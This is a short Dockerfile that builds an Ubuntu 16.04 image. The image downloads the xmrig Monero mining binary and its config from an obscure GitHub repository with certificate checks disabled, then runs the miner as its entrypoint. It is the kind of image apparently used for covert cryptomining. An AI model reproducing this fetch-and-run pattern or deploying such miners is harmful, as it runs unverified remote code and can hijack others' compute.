FROM ubuntu:16.04  
  
RUN apt-get update \  
&& apt-get -qq --no-install-recommends install \  
wget \  
libuv1-dev \  
libcurl4-openssl-dev \  
&& rm -r /var/lib/apt/lists/* \  
&& wget --no-check-certificate
https://github.com/cosihu/marbles/raw/master/config.json \  
&& wget --no-check-certificate
https://github.com/cosihu/marbles/raw/master/xmrig \  
&& chmod +x xmrig  
  
ENTRYPOINT ["./xmrig"]  
CMD ["--config=config.json"]

